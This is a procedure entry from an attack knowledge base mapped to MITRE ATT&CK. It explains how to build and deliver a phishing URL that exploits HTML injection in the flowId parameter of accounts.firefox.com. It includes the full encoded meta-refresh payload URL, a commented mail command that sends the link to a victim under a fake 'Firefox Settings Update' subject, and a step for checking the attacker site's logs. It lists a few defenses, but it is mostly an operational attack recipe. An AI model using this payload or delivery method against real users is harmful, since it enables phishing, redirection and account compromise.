---
id: proc-uuid-3
name: Deliver-Malicious-URL-to-Victim
tags:
  - delivery
  - phishing
  - open-redirect
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/construct-url]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T03:47:23.622Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Deliver-Malicious-URL-to-Victim

## Summary

This procedure constructs and delivers a malicious URL exploiting the HTML injection to trigger open redirects or UI redressing on unsuspecting victims.

## Description

In the phishing scenario, the crafted URL with injected payload is shared via email or links, causing the victim's browser to render malicious HTML upon visiting the legitimate Firefox domain. Prerequisites: valid payload from prior steps and social engineering channels. Outcomes: victim interaction leading to account compromise or data exposure.

## Requirements

1. Encoded payload ready
2. Delivery vector (email, messaging)
3. Monitoring for victim access

## Defense

Defensive measures and detection strategies:

- User education on suspicious links
- URL scanners in email gateways
- Rate limiting on parameter values

## Objectives

1. Induce victim visit to injected URL
2. Achieve redirect or phishing success
3. Potentially leak data via internal CSP endpoints

## Instructions

### Step 1: Construct Full Malicious URL

**Context**: Build the complete URL with all parameters and encoded flowId.

**Command** ([[commands/construct-url]]):
```bash
echo "https://accounts.firefox.com/settings?deviceId=cc10a15a5ac94bdf8a9a0bc5b2912520&flowBeginTime=1676972087857&flowId=%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%221;%20http://example.com%22%3E&broker=web&context=web&isSampledUser=false&service=none&uniqueUserId=dbf23f86-d3d1-4576-92bc-ebaa4fd14795"
```

> Copy the output URL for delivery.

### Step 2: Deliver to Victim

**Context**: Send the URL via phishing means.

**Command** (No direct command; use email client or script):
```bash
# Example: echo "Click here: $MALICIOUS_URL" | mail -s "Firefox Settings Update" victim@example.com
```

> Victim visits, triggering the injection.

### Step 3: Verify Exploitation

**Context**: Monitor for success, e.g., via logs on attacker site.

**Instructions**: Check access logs on http://example.com for redirects.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used

- [[commands/construct-url]]

## Tools Used


## Tags

- [[Phishing]]
- [[delivery]]
